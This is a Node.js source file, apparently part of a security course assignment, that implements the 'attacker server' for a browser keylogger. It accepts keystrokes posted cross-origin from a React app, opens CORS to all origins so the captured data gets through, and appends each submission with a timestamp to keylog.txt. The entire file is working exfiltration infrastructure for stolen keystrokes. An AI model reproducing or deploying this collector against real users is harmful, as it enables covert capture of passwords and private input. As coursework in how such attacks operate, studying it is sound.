const http = require("http");
const fs = require("fs");
const path = require("path");

const PORT = 4000;
const LOG_FILE = path.join(__dirname, "keylog.txt"); // repo root, next to this file

const server = http.createServer((req, res) => {
  // Keystrokes arrive as a cross-origin POST from the React app (http://localhost:3000).
  // Without this header the browser blocks the request and the keylogger looks broken
  // when it is actually working (lecture 9 / the assignment's CORS note).
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "*");

  if (req.method === "OPTIONS") {
    res.writeHead(204);
    res.end();
    return;
  }

  if (req.method === "POST") {
    const chunks = [];
    req.on("data", (chunk) => chunks.push(chunk));
    req.on("end", () => {
      const body = Buffer.concat(chunks).toString();
      const line = `[${new Date().toISOString()}] ${body}\n`;
      fs.appendFile(LOG_FILE, line, (err) => {
        if (err) {
          res.writeHead(500);
          res.end("error");
          return;
        }
        res.writeHead(200);
        res.end("ok");
      });
    });
    return;
  }

  res.writeHead(200);
  res.end("attacker server up");
});

server.listen(PORT, () => console.log(`Attacker server listening on http://localhost:${PORT}`));